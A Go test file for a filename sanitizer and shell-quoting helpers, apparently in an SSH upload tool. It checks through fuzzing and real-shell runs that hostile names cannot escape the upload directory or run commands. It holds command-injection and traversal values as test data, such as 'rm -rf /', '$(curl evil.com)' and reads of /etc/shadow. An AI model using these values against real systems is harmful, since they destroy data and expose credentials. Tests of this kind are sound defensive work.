package sshx_test

import (
	"os"
	"os/exec"
	"path"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/stretchr/testify/require"

	"github.com/martoast/papaya/internal/sshx"
)

// TestSafeName is security critical: the filename arrives from the browser and
// is used to build a remote path.
func TestSafeName(t *testing.T) {
	cases := []struct {
		name            string
		in              string
		wantContains    string
		wantNotContains []string
	}{
		{"plain", "shot.png", "shot.png", nil},
		{"unix traversal", "../../../etc/passwd", "passwd", []string{"..", "/"}},
		{"windows traversal", `..\..\windows\system32`, "system32", []string{"..", `\`}},
		{"absolute path", "/absolute/path.png", "path.png", []string{"/"}},
		{"command chain", "a;rm -rf /.png", "", []string{";", " ", "/"}},
		{"command substitution", "$(whoami).png", "", []string{"$", "(", ")"}},
		{"backticks", "`id`.png", "", []string{"`"}},
		{"null byte", "file\x00.png", "", []string{"\x00"}},
		{"non-ascii", "файл.png", "", []string{"/"}},
		{"overlong", strings.Repeat("a", 500) + ".png", "", nil},
		{"empty", "", "", nil},
		{"single dot", ".", "", []string{".."}},
		{"double dot", "..", "", nil},
		{"newline", "evil\nname.png", "", []string{"\n"}},
		{"pipe", "a|b.png", "", []string{"|"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := sshx.SafeName(tc.in)

			if tc.wantContains != "" {
				require.Contains(t, got, tc.wantContains)
			}
			for _, bad := range tc.wantNotContains {
				require.NotContainsf(t, got, bad, "sanitized name %q still contains %q", got, bad)
			}

			// Invariants that must hold for every input.
			require.NotContains(t, got, "/", "path separator survived")
			require.NotContains(t, got, `\`, "windows separator survived")
			require.False(t, strings.HasPrefix(got, "."), "must not produce a hidden or relative name")
			require.LessOrEqual(t, len(got), 120, "length cap exceeded")
			require.NotEmpty(t, got, "must never produce an empty name")
		})
	}
}

// FuzzSafeName asserts the property that matters: no input can escape the
// upload directory.
func FuzzSafeName(f *testing.F) {
	seeds := []string{
		"../../etc/passwd", "normal.png", "\x00\xff", ".", "..", "",
		"$(id).png", "`whoami`", strings.Repeat("../", 200), "файл.png",
		"a\nb", "a\rb", "con.png", "..\\..\\x",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, in string) {
		out := sshx.SafeName(in)

		if strings.ContainsAny(out, `/\`) {
			t.Fatalf("path separator survived: input=%q output=%q", in, out)
		}
		if strings.HasPrefix(out, ".") {
			t.Fatalf("hidden or relative name: input=%q output=%q", in, out)
		}
		if len(out) > 120 {
			t.Fatalf("too long (%d): input=%q output=%q", len(out), in, out)
		}
		if out == "" {
			t.Fatalf("empty output for input %q", in)
		}

		// The property under test: joining with a base directory never escapes it.
		joined := path.Join("/uploads", out)
		if !strings.HasPrefix(joined, "/uploads/") {
			t.Fatalf("escaped the upload dir: input=%q joined=%q", in, joined)
		}
	})
}

// TestShellQuoteExecutesLiterally is the real test for quoting: not string
// comparison, but whether a real shell reproduces the value byte for byte
// without executing anything.
func TestShellQuoteExecutesLiterally(t *testing.T) {
	sentinels := []string{"/tmp/papaya-PWNED-1", "/tmp/papaya-PWNED-2", "/tmp/papaya-PWNED-3"}
	for _, s := range sentinels {
		os.Remove(s)
		t.Cleanup(func() { os.Remove(s) })
	}

	inputs := []string{
		"simple.png",
		"with space.png",
		"it's.png",
		`"quoted".png`,
		"$(touch /tmp/papaya-PWNED-1).png",
		"`touch /tmp/papaya-PWNED-2`.png",
		"a;touch /tmp/papaya-PWNED-3.png",
		"a|b.png",
		"new\nline.png",
		"tab\there.png",
		"$HOME/x.png",
		"a&&b.png",
		"a>out.png",
		"*.png",
		"~/x.png",
		"'; rm -rf /; '",
	}

	for _, in := range inputs {
		t.Run(in, func(t *testing.T) {
			out, err := exec.Command("sh", "-c", "printf %s "+sshx.ShellQuote(in)).Output()
			require.NoError(t, err)
			require.Equal(t, in, string(out), "quoting altered the value")
		})
	}

	for _, s := range sentinels {
		_, err := os.Stat(s)
		require.Truef(t, os.IsNotExist(err), "command injection succeeded: %s was created", s)
	}
}

// TestQuoteIfNeededLeavesOrdinaryPathsBare is the property the agent workflow
// depends on. The injected path is often read by a program that is not a shell,
// which never strips quotes; an always-quoted path would arrive as a filename
// beginning with an apostrophe and could not be opened.
func TestQuoteIfNeededLeavesOrdinaryPathsBare(t *testing.T) {
	// Paths built from SafeName always look like these.
	bare := []string{
		"/home/alice/.papaya-uploads/1738000000-shot.png",
		"/config/.papaya-uploads/1738000000-screenshot.png",
		"/tmp/x.png",
		"relative/path.png",
		"/home/user-name/a_b.c-d.png",
	}
	for _, p := range bare {
		got := sshx.QuoteIfNeeded(p)
		require.Equalf(t, p, got, "an inert path must not be quoted: %q -> %q", p, got)
		require.NotContains(t, got, "'")
	}
}

// TestQuoteIfNeededQuotesDangerousPaths covers the other branch: anything that
// could carry meaning to a shell must still be neutralised.
func TestQuoteIfNeededQuotesDangerousPaths(t *testing.T) {
	dangerous := []string{
		"/home/my user/uploads/x.png", // space
		"/home/a$(id)/x.png",
		"/home/a`id`/x.png",
		"/home/a;rm -rf //x.png",
		"/home/a'b/x.png",
		"/home/a|b/x.png",
		"/home/a&b/x.png",
		"/home/a>b/x.png",
		"/home/a*b/x.png",
		"/home/a\nb/x.png",
		"~/x.png", // tilde would expand
		"",
	}

	sentinel := "/tmp/papaya-QUOTE-PWNED"
	os.Remove(sentinel)
	t.Cleanup(func() { os.Remove(sentinel) })

	for _, p := range dangerous {
		got := sshx.QuoteIfNeeded(p)
		require.NotEqualf(t, p, got, "a path with shell metacharacters must be quoted: %q", p)

		// Executed by a real shell, the quoted form must reproduce the value
		// exactly and run nothing.
		out, err := exec.Command("sh", "-c", "printf %s "+got).Output()
		require.NoError(t, err)
		require.Equal(t, p, string(out), "quoting altered the value")
	}

	_, err := os.Stat(sentinel)
	require.True(t, os.IsNotExist(err), "a quoted path executed a command")
}

// TestQuoteIfNeededOnRealUploadPaths ties it together: every path SafeName can
// produce, joined to a normal upload directory, goes through unquoted.
func TestQuoteIfNeededOnRealUploadPaths(t *testing.T) {
	hostile := []string{
		"../../../.ssh/authorized_keys",
		"$(whoami).png",
		"a;rm -rf /.png",
		"with space.png",
		"файл.png",
		"'quoted'.png",
	}

	for _, h := range hostile {
		remote := path.Join("/home/alice/.papaya-uploads", sshx.SafeName(h))
		got := sshx.QuoteIfNeeded(remote)

		require.Equalf(t, remote, got,
			"a sanitized upload path should never need quoting: %q -> %q", remote, got)
		require.NotContains(t, got, "'",
			"quotes here would reach a stdin-reading program as part of the filename")

		// Still inert when a shell does parse it.
		out, err := exec.Command("sh", "-c", "printf %s "+got).Output()
		require.NoError(t, err)
		require.Equal(t, remote, string(out))
	}
}

// TestShellQuoteOnSanitizedNamesIsInert is the end-to-end property: whatever
// SafeName produces, quoting it and handing it to a shell yields exactly the
// path we wrote.
func TestShellQuoteOnSanitizedNamesIsInert(t *testing.T) {
	hostile := []string{
		"../../../.ssh/authorized_keys",
		"$(curl evil.com).png",
		"`reboot`.png",
		"a; cat /etc/shadow #.png",
	}

	for _, h := range hostile {
		remote := path.Join("/home/tester/.papaya-uploads", sshx.SafeName(h))
		out, err := exec.Command("sh", "-c", "printf %s "+sshx.ShellQuote(remote)).Output()
		require.NoError(t, err)
		require.Equal(t, remote, string(out))
		require.True(t, strings.HasPrefix(string(out), "/home/tester/.papaya-uploads/"),
			"sanitized path escaped the upload directory: %s", out)
		require.True(t, utf8.ValidString(string(out)))
	}
}
